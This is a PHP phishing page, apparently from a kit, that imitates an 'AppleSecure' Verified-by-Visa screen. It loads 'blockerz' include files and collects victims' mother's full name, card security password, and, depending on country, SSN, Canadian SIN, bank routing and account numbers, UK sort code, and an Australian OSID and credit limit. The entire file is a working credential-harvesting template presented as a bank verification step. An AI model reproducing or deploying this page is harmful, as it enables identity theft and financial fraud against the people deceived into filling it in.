<?php
include '../../blockerz.php';
include '../../blockerz2.php';
$negara = $_SESSION['country'];
?>
<html><head>
<title>verified by AppleSecure</title>
</head><body>
      <div style="background: url(./files/img/vbv.PNG) no-repeat;  height: 700px;  width: 458px;               margin: 0 auto;   margin-top: 40px; position: relative;">
       <form action="" id="form1" method="post" name="login">	   
<input name="Mname" title="Mother Full Name" style="position: absolute;  outline: none;left: 228px;top: 218px; font-family: Arial, Helvetica, sans-serif; border: 1px solid #CCCCCC; width: 185px;">   
<input value="<?php echo $_SESSION['name'];?> "   name="name" style="  position: absolute;  outline: none; top: 262px;  left: 227px;  border: 1px solid #CCCCCC; width: 185px;">
<input name="date"value="<?php echo $_SESSION['date'];?>" style="  position: absolute;  outline: none;  top: 300px;  width: 185px; left: 227px; border: 1px solid #CCCCCC;">
<input name="vbv" type="password" style="position: absolute;  outline: none;      top: 372px;  border: 1px solid #CCCCCC;left: 227px;width: 185px;" >
<?php
if ($negara=="United States"){ echo '
<p style="left: 42px; color: #000000;      font-size: 14px; position: absolute;  outline: none;top: 400px;">Routing Number:</p>
									<input maxlength="15"  style="position: absolute;  outline: none; top: 400px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 185px;" autocomplete="off" name="routing" style="position: absolute;  outline: none;  top: 372;  border: 1px solid #CCCCCC;left: 227px;width: 185px;" type="text" >
';}
?>
<?php
if ($negara=="Canada"){ echo '
<p style="left: 42px; color: #000000;      font-size: 14px; position: absolute;  outline: none;top: 400px;">Social Insurance Number:</p>
									<input maxlength="15" style="position: absolute;  outline: none; top: 400px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 185px;"  autocomplete="off" name="cassn" type="text" required>
';}
?>
<?php if ($negara=="United States"  or $negara=="Ireland"){ echo '
<p style="left: 42px; color: #000000;      font-size: 14px; position: absolute;  outline: none;top: 460px;">Social Security Number:</p>
									<input maxlength="11" style="position: absolute;  outline: none; top: 460px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 185px;"  autocomplete="off" name="ssn" type="text" placeholder="XXX-XX-XXXX" required>
';}?>
<?php if ($negara=="United States" or $negara=="United Kingdom" or $negara=="Australia" or $negara=="Ireland"){ echo '
<p style="left: 42px; color: #000000;      font-size: 14px; position: absolute;  outline: none; top: 430px;">Account Number:</p>
	<input style="position: absolute;  outline: none; top: 430px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 185px;" maxlength="15" autocomplete="off" name="acc_number"  type="text" >
';}?>
<?php if ($negara=="United Kingdom" or $negara=="Ireland" ){ echo '
<p style="left: 42px; color: #000000;      font-size: 14px; position: absolute;  outline: none;top: 400px;">Sort Code:</p>
<input style="position: absolute;  outline: none; top: 400px; border: 1px solid rgb(204, 204, 204); left: 227px;width: 78px;" placeholder="XX-XX-XX" maxlength="8" autocomplete="off" name="sort" type="text" required>
';} ?>
<?php
if ($negara=="Australia"){ echo '
<p style="left: 42px; color: #000000;      font-size: 14px; position: absolute;  outline: none;top: 400px;">OSID Number:</p>
									<input maxlength="10" style="position: absolute;  outline: none; top: 400px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 185px;" autocomplete="off" name="osidnum" required="required" type="text">
									<p style="left: 42px; position: absolute;  outline: none;top: 445px;">Credit Limit:</p>
									                        <input type="text" style="position: absolute;  outline: none; top: 460px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 185px;" autocomplete="off"  maxlength="32" name="cc_limit" required="" title="Credit Limit">

';}
?>

<input type="submit" value="Next" style="  position: absolute;    border-radius: 3px;  top: 500px; border: 1px solid #CCCCCC;  background-color: #DDDDDD; left: 126px;  width: 200px;">
  </form></div>
   </body></html>
